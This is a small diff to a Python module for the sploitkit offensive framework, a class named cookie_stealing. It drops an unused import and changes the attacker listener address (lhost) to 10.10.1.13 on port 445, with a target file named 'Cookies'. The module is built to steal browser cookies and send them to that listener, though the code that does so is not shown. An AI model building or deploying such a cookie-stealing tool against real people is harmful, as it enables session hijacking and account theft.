@@ -1,7 +1,6 @@
 from sploitkit import *
 import os
 import subprocess
-from template import Procedure
 
 class cookie_stealing(Module):
 	""" Description Here
@@ -29,7 +28,7 @@ class cookie_stealing(Module):
 
 		#ARGUMENTOS DEL CODIGO CPP
 
-		lhost = "192.168.114.129"
+		lhost = "10.10.1.13"
 		lport = 445
 		nombre_archivo_cookies = "Cookies"
 
